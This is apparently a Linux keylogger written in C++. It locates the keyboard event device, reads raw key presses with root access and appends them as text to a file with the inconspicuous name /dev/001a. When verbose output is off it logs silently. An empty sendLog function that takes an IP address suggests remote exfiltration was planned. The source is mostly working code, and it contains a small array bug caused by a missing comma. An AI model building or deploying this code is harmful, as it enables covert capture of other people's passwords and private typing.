#include "logger.h"
using namespace logger;

struct termios consoleInterface; //Needed to turn console ECHO on/off
std::vector<std::string> keyCodes = { //List of keyboard scancodes
	"KEYBOARD ERROR",
	"ESC",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"BACKSPACE",
	"TAB",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"ENTER",
	"LEFT CNTRL",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"`",
	"LEFT SHIFT",
	"\\",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"RIGHT SHIFT",
	"KP *",
	"LEFT ALT",
	"SPACE",
	"CAPS LOCK",
	"F1",
	"F2",
	"F3",
	"F4",
	"F5",
	"F6",
	"F7",
	"F8",
	"F9",
	"F10",
	"NUM LOCK",
	"SCROLL LOCK",
	"KP HOME 7",
	"KP UP 8",
	"KP PAGE UP 9",
	"KP -",
	"KP LEFT 4",
	"KP 5",
	"KP RIGHT 6",
	"KP +", // Correct
	"KP END 1",
	"KP DOWN 2",
	"KP PAGE DOWN 3", // Correct
	"KP INS 0",
	"KP DEL .", // Correct 83
	"", //84
	"", //85
	"",//86
	"F11", // 87
	"F12", //88
	"", //89
	"",//90
	"",//91
	"", //92
	"", //93
	"", //94
	"", //95
	"KP ENTER", //96
	"RIGHT CNTRL", //97
	"KP /", //98
	"PRINT SCREEN", //99
	"RIGHT ALT", //100
	"", //101
	"HOME",//102
	"UP", //103
	"PAGE UP", //104
	"LEFT", //105
	"RIGHT", //106
	"END",//107
	"DOWN",//108
	"PAGE DOWN",//109
	"INSERT",//110
	"DELETE", //111
	"", //112
	"", //113
	"", //114
	"", //115
	"", //116
	"", //117
	"", //118
	"PAUSE BREAK" //119
	"", //120
	"", //121
	"", //122
	"", //123
	"", //124
	"LEFT META", // 125
	"", //126
	"COMPOSE"//127 RIGHT CLICK MENU
};

std::string logger::getDevices(bool verbose) {
	char buffer[128];
	std::string result = "";
	FILE * pipe = popen("cat /proc/bus/input/devices", "r");		
	if (verbose) std::cout << "Executing command: \x1B[32m" << "cat /proc/bus/input/devices" << "\x1B[0m" << std::endl;
	if (!pipe) {
		std::cout << "popen failed! Aborting program!" << std::endl;
		exit(1);
	}
	if(verbose) std::cout << "popen completed. Reading in result..." << std::endl;
	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe) != NULL) {
			result += buffer;
		}
	}
	if (result == "") {
		std::cout <<"Popen return empty string. Aborting!" << std::endl;
		exit(1);
	}
	else if (verbose) {
		std::cout<<"**************************************" <<std::endl << std::endl;
		std::cout << result << std::endl;
		std::cout<<"**************************************" << std::endl;
		std::cout << std::endl;
	}
	pclose(pipe);
	return result;
}

std::string logger::getHandler(std::string devices, bool verbose) {
	std::string handler = "";
	std::smatch m;  // flag type for determining the matching behavior (in this case on string objects)
	std::regex regexp("Handlers=sysrq kbd event[0-9]"); // regex expression for pattern to be searched
	
	std::regex_search(devices, m, regexp); //Finds the line containing the handler to the keyboard
	if (verbose) std::cout << "Using regex to search for handler." << std::endl;
	if (m.size() == 0){
		std::cout << "regex search returned no match! Aborting!" << std::endl;
		exit(1);
	}
	if (verbose) std::cout << "Regex search return: \x1B[32m" << m[0] << "\x1B[0m" << std::endl;
	if (verbose) std::cout << "Creating path to handler." << std::endl;
	
	std::string matched = m[0]; 
	size_t pos = matched.find("event"); //Used to find name of handler
	handler = "/dev/input/" + matched.substr (pos);
	if (verbose) std::cout << "Path: \x1B[32m" << handler << "\x1B[0m" << std::endl;
	return handler;
}

bool logger::fileExist (const std::string& name) {
	std::ifstream file(name.c_str());
	return bool(file.good());
}

void logger::disableEcho(bool verbose) {
	if (verbose) std::cout << "Disabling console ECHO"<<std::endl;
	// ECHO is the mask name associated with the struct termios that enable/disables echo
	int errCheck = tcgetattr(fileno(stdin), &consoleInterface); //get the parameters associated with the terminal
	
	if (errCheck == -1) {
		std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
		std::cout << "Failure getting console parameters! Can't disable console ECHO!" << std::endl;
	}
	consoleInterface.c_lflag &= ~ECHO; //flips the bit for ECHO thereby disabling it.
	
	errCheck = tcsetattr(fileno(stdin), 0, &consoleInterface); // set the parameters for the terminal
	if (errCheck == -1) {
		std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" <<std::endl;
		std::cout << "Failure setting console parameters! Can't disable console ECHO!" << std::endl;
	}
	return;
}

void logger::enableEcho(bool verbose) {
	if (verbose) std::cout << "Enabling console ECHO" << std::endl;
	
	int errCheck = tcgetattr(fileno(stdin), &consoleInterface); //get the parameters for the terminal
	if (errCheck == -1) {
		std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
		std::cout << "Failure getting console parameters! Can't enable console ECHO!" << std::endl;
	}

	consoleInterface.c_lflag |= ECHO; //flips the bit for ECHO thereby enabling it.
	
	errCheck = tcsetattr(fileno(stdin), 0, &consoleInterface);  // set the parameters for the terminal
	if (errCheck == -1) {
		std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
		std::cout << "Failure setting console parameters! Can't enable console ECHO!" << std::endl;
	}
	return;
}

void logger::connectHandler (std::string handler, bool verbose) {
	const char * fileName = handler.c_str();
	struct input_event holdEvent;
	if (verbose) std::cout << "Connecting to the handler..." << std::endl;
	int fd = open (fileName, O_RDONLY);

	if (fd == -1) {
		std::cout << "Error: \x1B[31m" << std::strerror(errno) << "\x1B[0m" << std::endl;
		std::cout << "Tip: Be sure to run the program using sudo." << std::endl;
		std::cout << "Failed to connect to handler! Aborting!" << std::endl;
		exit(1);
	}

	if (verbose) {
		std::cout << "Success!" << std::endl;
		std::cout << "Press any key to see the corresponding scancode." << std::endl;
		std::cout << "Press ESC to exit the program." << std::endl;
	}

	std::ofstream logFile;
	if (!(fileExist ("/dev/001a"))) {
		if (verbose) std::cout << "Creating new file: \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
		logFile.open("/dev/001a", std::ios_base::app);
	}
	else {
		if (verbose) std::cout <<  "Appending to file: \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
		logFile.open("/dev/001a", std::ios::out);
	} 

	if (verbose) std::cout << "To exit press ESC." << std::endl;
	if (verbose) disableEcho(verbose); //Disables console ECHO. Remains disable after program ends if not re-enabled.
	while (true) {
		read(fd, &holdEvent, sizeof(holdEvent));
		
		if (holdEvent.type == EV_KEY and holdEvent.value == 1) { //Checks for keypress down event.
			if (verbose) {
				// '\x1B[1m' and '\x1B[0m' allows for bolding in console window. These can be safely removed without damaging computer
				std::cout << "holdEvent.code: \x1B[1m" << holdEvent.code << "\x1B[0m\t";
				std::cout << "KeyCode: \x1B[1m" << keyCodes[holdEvent.code] << "\x1B[0m" <<std::endl;
				logFile << keyCodes[holdEvent.code]; //Record in file.
			}
			else {
				logFile << keyCodes[holdEvent.code];
			}
		}
		if (holdEvent.code == 1) { //Exit on ESC keypress.
			break;
		}
	}
	if (verbose) enableEcho(verbose); //Enables console ECHO.
	if (verbose) std::cout << "Closing \x1B[32m" << "/dev/001a" << "\x1B[0m" << std::endl;
	logFile.close();

	if (verbose) std::cout << "Closed connection to handler." << std::endl;
	close(fd);
	return;
}

void logger::sendLog (std::string logName, std::string ipAddress, bool verbose) {
	return;
}

void logger::debugKeyCode(bool debug) {
	if (debug) {
		for (int i = 0; i < int(keyCodes.size()); i++) {
			std::cout << "keyCodes["<<i<<"]: " << keyCodes[i] << std::endl;
		}
	}
}
